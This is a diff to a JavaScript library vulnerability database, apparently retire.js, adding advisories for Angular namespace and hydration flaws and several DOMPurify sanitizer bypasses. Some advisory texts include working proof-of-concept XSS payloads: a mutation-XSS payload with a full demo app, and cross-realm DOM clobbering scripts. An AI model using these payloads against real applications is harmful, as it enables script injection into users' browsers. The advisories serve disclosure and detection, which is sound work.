+                  CVE: [
+                    "CVE-2026-50557"
+                  ]
+                },
+                details: "An issue in the `@angular/compiler` and `@angular/core` packages allows bypassing element and attribute sanitization/validation through specific namespace workarounds.\n\nSpecifically, namespaced script elements (e.g., `<svg:script>` or `<:svg:script>`) were not properly identified as script elements by the Angular template preparser, allowing them to pass through template compilation without being stripped.\n\nFurthermore, security context schema mappings for element attributes did not consistently handle attributes within namespaced elements (like SVG and MathML), opening up gaps where malicious namespaced attributes could bypass runtime and compile-time sanitizers.\n\nCombined, these flaws enable an attacker who can inject or supply a template/tag structure with custom namespaces to bypass Angular's script-stripping logic and attribute sanitizers, leading to client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that compiles user-controlled templates at runtime, or relies on sanitization of namespaced elements/attributes, is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to inject a namespaced script element or dynamic attribute bindings, bypassing core sanitization constraints to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Template Input:** The application must accept user-controlled inputs that are directly processed by the Angular template compiler at runtime.\n2. **Namespace Parsing Support:** The input structure must employ custom namespace prefixes (such as `<svg:script>`) to evade standard tag-name blocklists/checks.\n3. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the Angular compiler.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-f3m7-gqxr-g87x",
+                  "https://github.com/angular/angular/pull/68689",
+                  "https://github.com/angular/angular/pull/68868"
+                ]
+              },
+              {
                 atOrAbove: "22.0.0-next.0",
                 below: "22.0.0-next.3",
                 severity: "high",
@@ -14881,6 +15922,28 @@ Upgrade to version 1.9.0 or later.`,
                   "https://github.com/angular/angular/commit/8630319f74c9575a21693d875cc7d5252516146d",
                   "https://github.com/angular/angular/commit/ed2d324f9cc12aab6cfa0569ef10b73243a62c65"
                 ]
+              },
+              {
+                atOrAbove: "22.0.0-next.0",
+                below: "22.0.1",
+                severity: "high",
+                cwe: [
+                  "CWE-79",
+                  "CWE-471"
+                ],
+                identifiers: {
+                  summary: "Angular Client Hydration DOM Clobbering & Response-Cache Poisoning",
+                  githubID: "GHSA-rgjc-h3x7-9mwg",
+                  CVE: [
+                    "CVE-2026-54267"
+                  ]
+                },
+                details: "To optimize client-side bootstrap in Server-Side Rendered (SSR) environments, Angular supports **Hydration** via `provideClientHydration()`. During SSR, Angular serializes the application's runtime state (such as cached `HttpClient` responses) and outputs it into the HTML stream as a `<script>` tag with a predictable identifier:\n\n```html\n<script type=\"application/json\" id=\"ng-state\">\n    {\"some-api-url\": {\"body\": ...}}\n<\/script>\n````\n\nDuring client bootstrap, Angular recovers this state by looking up the element via `document.getElementById('ng-state')` and parsing its text content.\n\nBecause the DOM element lookup for the state container is predictable and relies solely on the ID selector (`ng-state`), it is susceptible to **DOM Clobbering**.\n\nIf the application binds untrusted user input or CMS content to element properties such as `id` (e.g., `<div [id]=\"userInput\">` or `<a id=\"ng-state\">`) *before* the genuine `<script>` tag is parsed by the browser, the attacker-controlled element takes precedence in the DOM lookup.\n\nDuring hydration, when Angular calls `document.getElementById('ng-state')`, the browser returns the attacker's clobbered element. Angular then attempts to parse the text content or attributes of this clobbered element as JSON.\n\n### Impact\n\nBy clobbering the state element, the attacker can inject a custom JSON payload into Angular's `TransferState` cache. The most critical exploitation vector is poisoning the **HTTP Transfer Cache**.\n\n1. The attacker injects a clobbered `ng-state` element containing custom JSON.  \n2. The JSON maps a key (representing a target API endpoint URL) to a malicious payload of the attacker's choice.  \n3. During client-side initialization, Angular's `HttpClient` checks `TransferState` before making requests. Finding the poisoned key, `HttpClient` returns the forged response instantly instead of requesting the genuine backend API.\n\nDepending on how the application processes and renders the affected API response, this can lead to:\n\n* **DOM-based Cross-Site Scripting (XSS)** if poisoned fields are rendered using unsafe bindings.  \n* **Privilege Escalation** by spoofing user info or session details retrieved from poisoned API payloads.  \n* **UI Hijacking** and redirection by spoofing configuration endpoints.\n\n### Patched Versions\n\n* 22.0.1  \n* 21.2.17  \n* 20.3.25\n\n### Workarounds\n\nIf you cannot immediately update to a patched Angular version, apply the following workarounds:\n\n#### A. Avoid Dynamic/User-Controlled IDs\n\nAvoid binding raw user-supplied values or dynamic CMS IDs directly to element attributes. If dynamic IDs are required, sanitize them or prepend a static safe prefix:\n\n```html\n<!-- Vulnerable Pattern -->\n<div [id]=\"userControlledInput\">...</div>\n\n<!-- Mitigated Pattern -->\n<div [id]=\"'safe-prefix-' + userControlledInput\">...</div>\n```\n\n#### B. Configure a Custom Application ID\n\nDeclaring a unique, non-predictable `APP_ID` changes the ID suffix of the state element, making it harder for attackers to predict and target:\n\n```ts\n// app.config.ts\n\nimport { APP_ID } from '@angular/core';\nimport { provideClientHydration } from '@angular/platform-browser';\n\nexport const appConfig = {\n  providers: [\n    { provide: APP_ID, useValue: 'unique-obfuscated-app-id' },\n    provideClientHydration()\n  ]\n};\n\n```\n\nThis changes the state element lookup ID from `ng-state` to `unique-obfuscated-app-id-state`.",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg",
+                  "https://github.com/angular/angular/pull/69064",
+                  "https://github.com/angular/angular/commit/6bde84fa8e6a5770b54040fbbc9bf10d5d0386fa"
+                ]
               }
             ],
             extractors: {
@@ -14888,10 +15951,18 @@ Upgrade to version 1.9.0 or later.`,
                 "document.querySelector('[ng-version]').getAttribute('ng-version')",
                 "window.getAllAngularRootElements()[0].getAttribute(['ng-version'])"
               ],
+              filecontent: [
+                "/\\*\\*[\\s*]+@license Angular v(\xA7\xA7version\xA7\xA7)",
+                `\\[['"]ng-version['"],['"](\xA7\xA7version\xA7\xA7)['"]\\]`
+              ],
+              uri: [
+                "@angular/core@(\xA7\xA7version\xA7\xA7)/"
+              ],
               ast: [
-                '//ExportNamedDeclaration[       /ExportSpecifier/:exported[         /:name == "NgModuleFactory" ||          /:name == "\u0275BrowserDomAdapter"       ]     ]/ExportSpecifier[       /:exported/:name == "VERSION"     ]/:$local/:init/:arguments/:value',
+                '//ExportNamedDeclaration[       /ExportSpecifier/:exported[         /:name == "NgModuleFactory" ||         /:name == "\u0275BrowserDomAdapter" ||         /:name == "XSS_SECURITY_URL" ||         /:name == "ZONELESS_ENABLED"       ]     ]/ExportSpecifier[       /:exported/:name == "VERSION"     ]/:$local/:init/:arguments/:value',
                 '//CallExpression/ArrayExpression[/Literal/:value == "ng-version"]/MemberExpression[       /:property/:name == "full"     ]/:$object/:init/:arguments/:value',
-                '//CallExpression/ArrayExpression[/Literal/:value == "ng-version"]/:1/:value'
+                '//CallExpression/ArrayExpression[/Literal/:value == "ng-version"]/:1/:value',
+                '//CallExpression[/Literal/:value == "ng-version"]/MemberExpression[       /:property/:name == "full"     ]/:$object/:init/:arguments/:value'
               ]
             }
           },
@@ -16264,7 +17335,10 @@ Upgrade to version 1.9.0 or later.`,
                 ],
                 identifiers: {
                   summary: "When USE_PROFILES is enabled, DOMPurify rebuilds ALLOWED_ATTR as a plain array whose properties are looked up by name, making it susceptible to prototype pollution. If Array.prototype has been polluted with an event handler attribute name (e.g. onclick), DOMPurify will allow that event handler to survive sanitization, resulting in DOM-based XSS.",
-                  githubID: "GHSA-cj63-jhhr-wcxv"
+                  githubID: "GHSA-cj63-jhhr-wcxv",
+                  CVE: [
+                    "CVE-2026-65913"
+                  ]
                 },
                 details: "## Summary\nWhen `USE_PROFILES` is enabled, DOMPurify rebuilds `ALLOWED_ATTR` as a plain array before populating it with the requested allowlists. Because the sanitizer still looks up attributes via `ALLOWED_ATTR[lcName]`, any `Array.prototype` property that is polluted also counts as an allowlisted attribute. An attacker who can set `Array.prototype.onclick = true` (or a runtime already subject to prototype pollution) can thus force DOMPurify to keep event handlers such as `onclick` even when they are normally forbidden. The provided PoC sanitizes `<img onclick=...>` with `USE_PROFILES` and adds the sanitized output to the DOM; the polluted prototype allows the event handler to survive and execute, turning what should be a blocklist into a silent XSS vector.\n\n## Impact\nPrototype pollution makes DOMPurify accept dangerous event handler attributes, which bypasses the sanitizer and results in DOM-based XSS once the sanitized markup is rendered.\n\n## Credits\nIdentified by Cantina\u2019s Apex (https://www.cantina.security).",
                 info: [
@@ -16281,7 +17355,10 @@ Upgrade to version 1.9.0 or later.`,
                 ],
                 identifiers: {
                   summary: "DOMPurify's ADD_ATTR predicate function mechanism (via EXTRA_ELEMENT_HANDLING.attributeCheck) short-circuits URI validation when the predicate returns true. This allows unsafe protocols such as javascript: to survive sanitization in href and similar attributes, enabling DOM-based XSS when such links are activated.",
-                  githubID: "GHSA-cjmm-f4jc-qw8r"
+                  githubID: "GHSA-cjmm-f4jc-qw8r",
+                  CVE: [
+                    "CVE-2026-65912"
+                  ]
                 },
                 details: '## Summary\nDOMPurify allows `ADD_ATTR` to be provided as a predicate function via `EXTRA_ELEMENT_HANDLING.attributeCheck`. When the predicate returns `true`, `_isValidAttribute` short-circuits the attribute check before URI-safe validation runs. An attacker who supplies a predicate that accepts specific attribute/tag combinations can then sanitize input such as `<a href="javascript:alert(document.domain)">` and have the `javascript:` URL survive, because URI validation is skipped for that attribute while other checks still pass. The provided PoC accepts `href` for anchors and then triggers a click inside an iframe, showing that the sanitized payload executes despite the protocol bypass.\n\n## Impact\nPredicate-based allowlisting bypasses DOMPurify\'s URI validation, allowing unsafe protocols such as `javascript:` to reach the DOM and execute whenever the link is activated, resulting in DOM-based XSS.\n\n## Credits\nIdentified by Cantina\u2019s Apex (https://www.cantina.security).',
                 info: [
@@ -16298,7 +17375,10 @@ Upgrade to version 1.9.0 or later.`,
                 ],
                 identifiers: {
                   summary: "DOMPurify is vulnerable to mutation-XSS (mXSS) when sanitized HTML is embedded into special raw-text wrapper elements such as xmp, script, iframe, noembed, noframes, or noscript before being assigned via innerHTML. Attacker-controlled sequences like </xmp> inside attribute values close the raw-text context during the second parse, causing the sanitized output to mutate into executable markup.",
-                  githubID: "GHSA-h8r8-wccr-v5f2"
+                  githubID: "GHSA-h8r8-wccr-v5f2",
+                  CVE: [
+                    "CVE-2026-65914"
+                  ]
                 },
                 details: '## Description\n\nA mutation-XSS (mXSS) condition was confirmed when sanitized HTML is reinserted into a new parsing context using `innerHTML` and special wrappers. The vulnerable wrappers confirmed in browser behavior are `script`, `xmp`, `iframe`, `noembed`, `noframes`, and `noscript`. The payload remains seemingly benign after `DOMPurify.sanitize()`, but mutates during the second parse into executable markup with an event handler, enabling JavaScript execution in the client (`alert(1)` in the PoC).\n\n\n## Vulnerability\n\nThe root cause is context switching after sanitization: sanitized output is treated as trusted and concatenated into a wrapper string (for example, `<xmp> ... </xmp>` or other special wrappers) before being reparsed by the browser. In this flow, attacker-controlled text inside an attribute (for example `</xmp>` or equivalent closing sequences for each wrapper) closes the special parsing context early and reintroduces attacker markup (`<img ... onerror=...>`) outside the original attribute context. DOMPurify sanitizes the original parse tree, but the application performs a second parse in a different context, reactivating dangerous tokens (classic mXSS pattern).\n\n## PoC\n\n1. Start the PoC app:\n```bash\nnpm install\nnpm start\n```\n\n2. Open `http://localhost:3001`.\n3. Set `Wrapper en sink` to `xmp`.\n4. Use payload:\n```html\n <img src=x alt="</xmp><img src=x onerror=alert(\'expoc\')>">\n```\n\n5. Click `Sanitize + Render`.\n6. Observe:\n- `Sanitized response` still contains the `</xmp>` sequence inside `alt`.\n- The sink reparses to include `<img src="x" onerror="alert(\'expoc\')">`.\n- `alert(\'expoc\')` is triggered.\n7. Files:\n- index.html\n\n```html\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1">\n    <title>expoc - DOMPurify SSR PoC</title>\n    <style>\n      :root {\n        --bg: #f7f8fb;\n        --panel: #ffffff;\n        --line: #d8dce6;\n        --text: #0f172a;\n        --muted: #475569;\n        --accent: #0ea5e9;\n      }\n\n      * {\n        box-sizing: border-box;\n      }\n\n      body {\n        margin: 0;\n        font-family: "SF Mono", Menlo, Consolas, monospace;\n        color: var(--text);\n        background: radial-gradient(circle at 10% 0%, #e0f2fe 0%, var(--bg) 60%);\n      }\n\n      main {\n        max-width: 980px;\n        margin: 28px auto;\n        padding: 0 16px 20px;\n      }\n\n      h1 {\n        margin: 0 0 10px;\n        font-size: 1.45rem;\n      }\n\n      p {\n        margin: 0;\n        color: var(--muted);\n      }\n\n      .grid {\n        display: grid;\n        gap: 14px;\n        margin-top: 16px;\n      }\n\n      .card {\n        background: var(--panel);\n        border: 1px solid var(--line);\n        border-radius: 12px;\n        padding: 14px;\n      }\n\n      label {\n        display: block;\n        margin-bottom: 7px;\n        font-size: 0.85rem;\n        color: var(--muted);\n      }\n\n      textarea,\n      input,\n      select,\n      button {\n        width: 100%;\n        border: 1px solid var(--line);\n        border-radius: 8px;\n        padding: 9px 10px;\n        font: inherit;\n        background: #fff;\n      }\n\n      textarea {\n        min-height: 110px;\n        resize: vertical;\n      }\n\n      .row {\n        display: grid;\n        grid-template-columns: 1fr 230px;\n        gap: 12px;\n      }\n\n      button {\n        cursor: pointer;\n        background: var(--accent);\n        color: #fff;\n        border-color: #0284c7;\n      }\n\n      #sink {\n        min-height: 90px;\n        border: 1px dashed #94a3b8;\n        border-radius: 8px;\n        padding: 10px;\n        background: #f8fafc;\n      }\n\n      pre {\n        margin: 0;\n        white-space: pre-wrap;\n        word-break: break-word;\n      }\n\n      .note {\n        margin-top: 8px;\n        font-size: 0.85rem;\n      }\n\n      .status-grid {\n        display: grid;\n        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));\n        gap: 8px;\n        margin-top: 10px;\n      }\n\n      .status-item {\n        border: 1px solid var(--line);\n        border-radius: 8px;\n        padding: 8px 10px;\n        font-size: 0.85rem;\n        background: #fff;\n      }\n\n      .status-item.vuln {\n        border-color: #ef4444;\n        background: #fef2f2;\n      }\n\n      .status-item.safe {\n        border-color: #22c55e;\n        background: #f0fdf4;\n      }\n\n      @media (max-width: 760px) {\n        .row {\n          grid-template-columns: 1fr;\n        }\n      }\n    </style>\n  </head>\n  <body>\n    <main>\n      <h1>expoc - DOMPurify Server-Side PoC</h1>\n      <p>\n        Flujo: input -> POST /sanitize (Node + jsdom + DOMPurify) -> render vulnerable con innerHTML.\n      </p>\n\n      <div class="grid">\n        <section class="card">\n          <label for="payload">Payload</label>\n          <textarea id="payload"><img src=x alt="<\/script><img src=x onerror=alert(\'expoc\')>"></textarea>\n          <div class="row" style="margin-top: 10px;">\n            <div>\n              <label for="wrapper">Wrapper en sink</label>\n              <select id="wrapper">\n                <option value="div">div</option>\n                <option value="textarea">textarea</option>\n                <option value="title">title</option>\n                <option value="style">style</option>\n                <option value="script" selected>script</option>\n                <option value="xmp">xmp</option>\n                <option value="iframe">iframe</option>\n                <option value="noembed">noembed</option>\n                <option value="noframes">noframes</option>\n                <option value="noscript">noscript</option>\n              </select>\n            </div>\n            <div style="display:flex;align-items:end;">\n              <button id="run" type="button">Sanitize + Render</button>\n            </div>\n          </div>\n          <p class="note">Se usa render vulnerable: <code>sink.innerHTML = \'&lt;wrapper&gt;\' + sanitized + \'&lt;/wrapper&gt;\'</code>.</p>\n          <div class="status-grid">\n            <div class="status-item vuln">script (vulnerable)</div>\n            <div class="status-item vuln">xmp (vulnerable)</div>\n            <div class="status-item vuln">iframe (vulnerable)</div>\n            <div class="status-item vuln">noembed (vulnerable)</div>\n            <div class="status-item vuln">noframes (vulnerable)</div>\n            <div class="status-item vuln">noscript (vulnerable)</div>\n            <div class="status-item safe">div (no vulnerable)</div>\n            <div class="status-item safe">textarea (no vulnerable)</div>\n            <div class="status-item safe">title (no vulnerable)</div>\n            <div class="status-item safe">style (no vulnerable)</div>\n          </div>\n        </section>\n\n        <section class="card">\n          <label>Sanitized response</label>\n          <pre id="sanitized">(empty)</pre>\n        </section>\n\n        <section class="card">\n          <label>Sink</label>\n          <div id="sink"></div>\n        </section>\n      </div>\n    </main>\n\n    <script>\n      const payload = document.getElementById(\'payload\');\n      const wrapper = document.getElementById(\'wrapper\');\n      const run = document.getElementById(\'run\');\n      const sanitizedNode = document.getElementById(\'sanitized\');\n      const sink = document.getElementById(\'sink\');\n\n      run.addEventListener(\'click\', async () => {\n        const response = await fetch(\'/sanitize\', {\n          method: \'POST\',\n          headers: { \'Content-Type\': \'application/json\' },\n          body: JSON.stringify({ input: payload.value })\n        });\n\n        const data = await response.json();\n        const sanitized = data.sanitized || \'\';\n        const w = wrapper.value;\n\n        sanitizedNode.textContent = sanitized;\n        sink.innerHTML = \'<\' + w + \'>\' + sanitized + \'</\' + w + \'>\';\n      });\n    <\/script>\n  </body>\n</html>\n```\n\n- server.js\n\n```js\nconst express = require(\'express\');\nconst path = require(\'path\');\nconst { JSDOM } = require(\'jsdom\');\nconst createDOMPurify = require(\'dompurify\');\n\nconst app = express();\nconst port = process.env.PORT || 3001;\n\nconst window = new JSDOM(\'\').window;\nconst DOMPurify = createDOMPurify(window);\n\napp.use(express.json());\napp.use(express.static(path.join(__dirname, \'public\')));\n\napp.get(\'/health\', (_req, res) => {\n  res.json({ ok: true, service: \'expoc\' });\n});\n\napp.post(\'/sanitize\', (req, res) => {\n  const input = typeof req.body?.input === \'string\' ? req.body.input : \'\';\n  const sanitized = DOMPurify.sanitize(input);\n  res.json({ sanitized });\n});\n\napp.listen(port, () => {\n  console.log(`expoc running at http://localhost:${port}`);\n});\n```\n\n- package.json\n\n```json\n{\n  "name": "expoc",\n  "version": "1.0.0",\n  "main": "server.js",\n  "scripts": {\n    "test": "echo \\"Error: no test specified\\" && exit 1",\n    "start": "node server.js",\n    "dev": "node server.js"\n  },\n  "keywords": [],\n  "author": "",\n  "license": "ISC",\n  "description": "",\n  "dependencies": {\n    "dompurify": "^3.3.1",\n    "express": "^5.2.1",\n    "jsdom": "^28.1.0"\n  }\n}\n```\n\n## Evidence\n\n- PoC\n\n[daft-video.webm](https://github.com/user-attachments/assets/499a593d-0241-4ab8-95a9-cf49a00bda90)\n\n- XSS triggered\n<img width="2746" height="1588" alt="daft-img" src="https://github.com/user-attachments/assets/1f463c14-d5a3-4c93-94e4-12d2d02c7d15" />\n\n## Why This Happens\nThis is a mutation-XSS pattern caused by a parse-context mismatch:\n\n- Parse 1 (sanitization phase): input is interpreted under normal HTML parsing rules.\n- Parse 2 (sink phase): sanitized output is embedded into a wrapper that changes parser state (`xmp` raw-text behavior).\n- Attacker-controlled sequence (`</xmp>`) gains structural meaning in parse 2 and alters DOM structure.\n\nSanitization is not a universal guarantee across all future parsing contexts. The sink design reintroduces risk.\n\n## Remediation Guidance\n1. Do not concatenate sanitized strings into new HTML wrappers followed by `innerHTML`.\n2. Keep the rendering context stable from sanitize to sink.\n3. Prefer DOM-safe APIs (`textContent`, `createElement`, `setAttribute`) over string-based HTML composition.\n4. If HTML insertion is required, sanitize as close as possible to final insertion context and avoid wrapper constructs with raw-text semantics (`xmp`, `script`, etc.).\n5. Add regression tests for context-switch/mXSS payloads (including `</xmp>`, `</noscript>`, similar parser-breakout markers).\n\nReported by Oscar Uribe, Security Researcher at Fluid Attacks. Camilo Vera and Cristian Vargas from the Fluid Attacks Research Team have identified a mXSS via Re-Contextualization in DomPurify 3.3.1.\n\nFollowing Fluid Attacks [Disclosure Policy](https://fluidattacks.com/advisories/policy), if this report corresponds to a vulnerability and the conditions outlined in the policy are met, this advisory will be published on the website over the next few days (the timeline may vary depending on maintainers\' willingness to attend to and respond to this report) at the following URL: https://fluidattacks.com/advisories/daft\n\nAcknowledgements: [Camilo Vera](https://github.com/caverav/) and [Cristian Vargas](https://github.com/tachote).',
                 info: [
@@ -16336,7 +17416,10 @@ Upgrade to version 1.9.0 or later.`,
                 ],
                 identifiers: {
                   summary: "DOMPurify has a logic inconsistency where FORBID_TAGS is not checked when a function-based ADD_TAGS (tagCheck) returns true. Due to short-circuit evaluation, the FORBID_TAGS check is never evaluated, allowing explicitly forbidden elements to pass through sanitization when EXTRA_ELEMENT_HANDLING.tagCheck is configured.",
-                  githubID: "GHSA-39q2-94rc-95cp"
+                  githubID: "GHSA-39q2-94rc-95cp",
+                  CVE: [
+                    "CVE-2026-65903"
+                  ]
                 },
                 details: "## Summary\nIn `src/purify.ts:1117-1123`, `ADD_TAGS` as a function (via `EXTRA_ELEMENT_HANDLING.tagCheck`) bypasses `FORBID_TAGS` due to short-circuit evaluation.\n\nThe condition:\n```\n!(tagCheck(tagName)) && (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])\n```\nWhen `tagCheck(tagName)` returns `true`, the entire condition is `false` and the element is kept \u2014 `FORBID_TAGS[tagName]` is never evaluated.\n\n## Inconsistency\nThis contradicts the attribute-side pattern at line 1214 where `FORBID_ATTR` explicitly wins first:\n```\nif (FORBID_ATTR[lcName]) { continue; }\n```\nFor tags, FORBID should also take precedence over ADD.\n\n## Impact\nApplications using both `ADD_TAGS` as a function and `FORBID_TAGS` simultaneously get unexpected behavior \u2014 forbidden tags are allowed through. Config-dependent but a genuine logic inconsistency.\n\n## Suggested Fix\nCheck `FORBID_TAGS` before `tagCheck`:\n```\nif (FORBID_TAGS[tagName]) { /* remove */ }\nelse if (tagCheck(tagName) || ALLOWED_TAGS[tagName]) { /* keep */ }\n```\n\n## Affected Version\nv3.3.3 (commit 883ac15)",
                 info: [
@@ -16491,6 +17574,189 @@ Reporter: Koda Reef`,
                 info: [
                   "https://github.com/cure53/DOMPurify/security/advisories/GHSA-87xg-pxx2-7hvx"
                 ]
+              },
+              {
+                atOrAbove: "0",
+                below: "3.4.6",
+                severity: "medium",
+                cwe: [
+                  "CWE-79",
+                  "CWE-501",
+                  "CWE-693"
+                ],
+                identifiers: {
+                  summary: "DOMPurify: Cross-realm IN_PLACE sanitization leaves executable markup intact via realm-bound `instanceof` checks",
+                  githubID: "GHSA-hpcv-96wg-7vj8",
+                  CVE: [
+                    "CVE-2026-49458"
+                  ]
+                },
+                details: "# Cross-realm IN_PLACE sanitization leaves executable markup intact via realm-bound `instanceof` checks\n\n**CWE**: CWE-79 (XSS \u2014 Improper Neutralization of Input During Web Page Generation) via CWE-693 (Protection Mechanism Failure \u2014 realm-bound `instanceof` checks fail-open on foreign-realm DOM nodes) and CWE-501 (Trust Boundary Violation \u2014 foreign-realm nodes accepted for sanitization but later checks are bound to the parent realm)\n\n## Summary\n\n`DOMPurify.sanitize(node, { IN_PLACE: true })` accepts a DOM node from any same-origin realm (e.g. a node owned by an application-created iframe document), but several follow-on security checks compare the node against constructors from the parent realm. Because constructors are per-realm, `instanceof HTMLFormElement`, `instanceof NamedNodeMap`, `instanceof DocumentFragment`, and `instanceof Element` all return `false` for nodes belonging to the iframe's realm. The library therefore proceeds as if the foreign-realm form is not clobberable, the foreign-realm `<template>`'s `.content` is not a document fragment, and the foreign-realm attached shadow root is not a document fragment \u2014 silently skipping the clobber/template-content/shadow-DOM sanitization branches that those checks gate. Attacker-controlled markup survives in form attributes, template content, and attached shadow roots, and executes when the application later inserts or activates the sanitized node.\n\n## Affected\n\n- DOMPurify \u2264 3.4.5, including `main` at `89da34e03ec17868e561f87f3747a9371b61a9e7`\n- Any caller that constructs or parses untrusted DOM in a same-origin iframe (or any other same-origin realm \u2014 popup window, opened tab, programmatically-created `<iframe srcdoc>`) and then calls `DOMPurify.sanitize(foreignNode, { IN_PLACE: true })` against a sanitizer instance bound to a different realm\n\nNot affected:\n- String-input `DOMPurify.sanitize(dirtyString)` \u2014 the library calls its own parser inside `_initDocument`, the resulting nodes belong to the sanitizer's own realm, and the `instanceof` checks resolve as expected\n- IN_PLACE calls where the input node was created in the same realm as the DOMPurify instance\n\n## Vulnerability details\n\nThe unifying defect is that `_isClobbered`, `_sanitizeShadowDOM`'s template-content recursion, and `_sanitizeAttachedShadowRoots` all use realm-bound `instanceof` checks against the parent-realm constructors. Each branch fails-open for foreign-realm objects.\n\n### [A] \u2014 `_isClobbered` gates on `element instanceof HTMLFormElement`\n\n`src/purify.ts:1120-1140`:\n\n```ts\nconst _isClobbered = function (element: Element): boolean {\n  return (\n    element instanceof HTMLFormElement &&    // [A] realm-bound \u2014 false for any\n                                              //     iframe-realm <form> element\n    (typeof element.nodeName !== 'string' ||\n      typeof element.textContent !== 'string' ||\n      typeof element.removeChild !== 'function' ||\n      !(element.attributes instanceof NamedNodeMap) ||   // [A'] also realm-bound\n      typeof element.removeAttribute !== 'function' ||\n      typeof element.setAttribute !== 'function' ||\n      typeof element.namespaceURI !== 'string' ||\n      typeof element.insertBefore !== 'function' ||\n      typeof element.hasChildNodes !== 'function' ||\n      !(element.childNodes && typeof element.childNodes.length === 'number'))\n  );\n};\n```\n\nA foreign-realm `<form>` is an instance of the foreign realm's `HTMLFormElement`, not the parent realm's. The leading `instanceof` short-circuits to `false`, so `_isClobbered` returns `false` regardless of the named-property clobbering present on the form. The follow-on `_sanitizeAttributes` then iterates `currentNode.attributes` \u2014 which itself can be a clobbered value (a foreign-realm `<input>` whose `name=\"attributes\"` shadows the form's real `NamedNodeMap`). The attribute walk traverses the wrong collection and never reaches the actual `onmouseover` / `onclick` / `action=javascript:` attributes on the form root.\n\n### [B] \u2014 `_sanitizeShadowDOM` gates template recursion on `content instanceof DocumentFragment`\n\n`src/purify.ts:1660-1662`:\n\n```ts\nwhile ((shadowNode = shadowIterator.nextNode())) {\n  ...\n  _sanitizeElements(shadowNode);\n  _sanitizeAttributes(shadowNode);\n  /* Deep shadow DOM detected */\n  if (shadowNode.content instanceof DocumentFragment) {   // [B] realm-bound\n    _sanitizeShadowDOM(shadowNode.content);\n  }\n}\n```\n\nThe same check exists in the main iterator at `:1861-1862`:\n\n```ts\nif (currentNode.content instanceof DocumentFragment) {     // [B'] realm-bound\n  _sanitizeShadowDOM(currentNode.content);\n}\n```\n\nFor a `<template>` element constructed in a foreign realm, `template.content` is a `DocumentFragment` from that realm \u2014 not from the parent realm. Both checks miss it, and the template's contents (which carry attacker-controlled `<img src=x onerror=...>` etc.) are never walked. The sanitized output appears clean from the outside, but the moment a consumer does `node.cloneNode(true)` / `importNode(template.content, true)` / inserts it into the live DOM, the embedded handler fires.\n\n### [C] \u2014 `_sanitizeAttachedShadowRoots` gates recursion on `sr instanceof DocumentFragment`\n\n`src/purify.ts:1702-1712`:\n\n```ts\nif (nodeType === NODE_TYPE.element) {\n  const sr = getShadowRoot\n    ? getShadowRoot(root)\n    : (root as Element).shadowRoot;\n  if (sr instanceof DocumentFragment) {                    // [C] realm-bound\n    _sanitizeAttachedShadowRoots(sr);\n    _sanitizeShadowDOM(sr);\n  }\n}\n```\n\nFor a host element constructed in a foreign realm with `host.attachShadow({mode:'open'})`, `host.shadowRoot` is a foreign-realm `ShadowRoot` (which extends the foreign realm's `DocumentFragment`). The `instanceof DocumentFragment` against the parent realm fails. The whole shadow subtree is skipped. When the host is later attached to the live document, the shadow DOM activates with attacker-controlled content.\n\n### The mismatch\n\nDOMPurify *accepts* foreign-realm nodes for sanitization (the entry-point's `_isNode(dirty)` at `:1750` is realm-agnostic \u2014 it checks shape, not constructor identity), so callers reasonably expect that the library's downstream defenses are equally realm-agnostic. They are not. `[A]` / `[B]` / `[C]` each fail-open for foreign-realm objects. A correct guard at each of those sites would use a realm-independent shape check (e.g., `nodeType === 11` for `DocumentFragment`, tag-name comparison for `HTMLFormElement` recognition).\n\n## Proof of concept\n\nEach PoC creates the attacker payload in a same-origin iframe, then calls the parent-realm `DOMPurify.sanitize(node, { IN_PLACE: true })` and verifies that handler execution succeeds on subsequent activation.\n\n### PoC 1 \u2014 cross-realm form clobbering survives\n\n```js\nconst iframe = document.createElement('iframe');\niframe.srcdoc = '<!doctype html><html><body></body></html>';\niframe.onload = () => {\n  const idoc = iframe.contentDocument;\n  const div = idoc.createElement('div'); div.id = 'dirty';\n  const form = idoc.createElement('form');\n  form.setAttribute('onmouseover',\n    'window.parent.__dompurify_xss=(window.parent.__dompurify_xss||0)+1');\n  const inp = idoc.createElement('input');\n  inp.setAttribute('name', 'attributes');                  // clobbers form.attributes\n  form.appendChild(inp);\n  div.appendChild(form);\n\n  DOMPurify.sanitize(div, { IN_PLACE: true });\n\n  window.__dompurify_xss = 0;\n  document.body.appendChild(div);\n  form.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));\n  // window.__dompurify_xss === 1\n};\ndocument.body.appendChild(iframe);\n```\n\nObserved (Chromium 148, DOMPurify 3.4.5, HEAD `89da34e`):\n\n```json\n{\n  \"sanitizeError\": null,\n  \"before\": {\n    \"formIsMainRealmHTMLFormElement\": false,\n    \"formIsForeignRealmHTMLFormElement\": true,\n    \"formAttributesType\": \"[object HTMLInputElement]\",\n    \"formAttributesEqualsInput\": true\n  },\n  \"after\": {\n    \"html\": \"<div id=\\\"dirty\\\"><form onmouseover=\\\"window.parent.__dompurify_xss=(window.parent.__dompurify_xss||0)+1\\\"><input></form></div>\",\n    \"formOnmouseover\": \"window.parent.__dompurify_xss=(window.parent.__dompurify_xss||0)+1\",\n    \"xssExecuted\": 1\n  }\n}\n```\n\n### PoC 2 \u2014 cross-realm `<template>` content is never walked\n\n```js\nconst iframe = document.createElement('iframe');\niframe.srcdoc = '<!doctype html><html><body></body></html>';\niframe.onload = () => {\n  const idoc = iframe.contentDocument;\n  const div = idoc.createElement('div');\n  const tpl = idoc.createElement('template');\n  tpl.innerHTML = '<img src=\"x\" onerror=' +\n    '\"window.parent.__dompurify_template_xss=(window.parent.__dompurify_template_xss||0)+1\">';\n  div.appendChild(tpl);\n\n  DOMPurify.sanitize(div, { IN_PLACE: true });\n\n  window.__dompurify_template_xss 